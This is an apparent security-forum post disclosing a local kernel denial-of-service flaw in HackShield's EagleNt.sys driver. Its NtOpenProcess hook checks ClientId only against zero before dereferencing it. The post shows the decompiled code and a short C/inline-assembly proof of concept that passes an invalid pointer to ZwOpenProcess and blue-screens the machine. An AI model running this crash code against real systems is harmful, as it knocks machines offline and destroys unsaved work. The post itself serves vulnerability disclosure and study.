
# [原创]HackShield EagleNt.sys 本地内核拒绝服务漏洞

HackShield `EagleNt.sys` 本地内核拒绝服务漏洞

## 影响范围
`HackShield`

## 漏洞细节

```
v26 = (int)ClientId;

InterlockedIncrement(&dword_29D10);

if ( !v26 )
    goto LABEL_14;

......

xxxx(......*(_DWORD *)v26,......)
```

`EagleNt.sys` 在自己的 `NtOpenProcess` HOOK 函数中参数检测不严格 ,没有验证参数的正确性就直接使用,并且没有使用 `SEH` 来捕捉函数中的异常

虽然程序有检查 `ClientId` 是否为0,但是可惜的是 `ClientId` 是一个指针(`PCLIENT_ID ClientId`),只要我们随便传递一个不为0的非法地址就可以触发异常..

## 测试代码

```
int main(int argc, char* argv[])
{
printf("HS 0day  By 单行\n");
printf("请保存好你的数据,按下回车键后激活0day\n");
getchar();

GetProcAddress(GetModuleHandle("ntdll.dll"),"ZwOpenProcess");
__asm
{
    push 1  //ClientId  地址
    push 0
    push 0
    push 0
    call eax
}
return 0 ;
}
```

以上代码运行在有 `HackShield` 驱动的机器上就可以触发蓝屏

这篇文章的格式是按照 `MJ0011` 博客里面的那种格式写的......小弟初学 `0DAY`,有错误的地方麻烦各位大大指出.....

各位大大们别喷我,我只是个菜鸟

## 感言

想不到 `HackShield` 这种“高级”产品上面，也有这种“低级”漏洞

[[招生]科锐逆向工程师培训(2026年11月13日实地，远程教学同时开班, 第57期)](https://bbs.kanxue.com/thread-51839.htm)
